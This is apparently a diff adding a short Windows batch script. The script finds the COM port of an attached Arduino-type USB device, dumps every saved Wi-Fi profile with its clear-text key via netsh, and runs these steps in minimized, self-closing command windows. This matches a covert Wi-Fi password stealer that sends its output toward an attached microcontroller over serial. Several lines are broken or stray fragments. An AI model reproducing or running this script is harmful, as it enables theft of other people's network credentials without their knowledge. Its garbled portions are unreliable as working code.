@@ -1,0 +1,18 @@
+for /f \"tokens=2 delims=()\" %%P in ('
+wmic path Win32_PnPEntity where \"PNPDeviceID like 'USB\\\\VID_2341&PID_484C%'\" get Name ^| find \"COM\"
+') 
+
+for /f "tokens=2,* delims=:" %i in ('netsh wlan show profiles ^| findstr /r ".*All User Profile.*"') do @for /f "tokens=*" %j in ("%i") do @echo %j & netsh wlan show profile name="%j" key=clear | findstr "Key Content")
+
+for /f "tokens=2 delims=()" %P in ('wmic path Win32_PnPEntity where "PNPDeviceID like 'USB\\VID_2341&PID_484C%'" get Name ^| find "COM" ') do (mode %P:115200,n,8,1 & ls > \\.\\%P)
+
+
+
+mode COM8:115200,n,8,1
+
+start /min cmd /c
+
+start /min dir & exit
+
+
+start /min cmd /k (for /f "tokens=2,* delims=:" %i in ('netsh wlan show profiles ^| findstr /r ".*All User Profile.*"') do @for /f "tokens=*" %j in ("%i") do @echo %j & netsh wlan show profile name="%j" key=clear | findstr "Key Content")) & exit
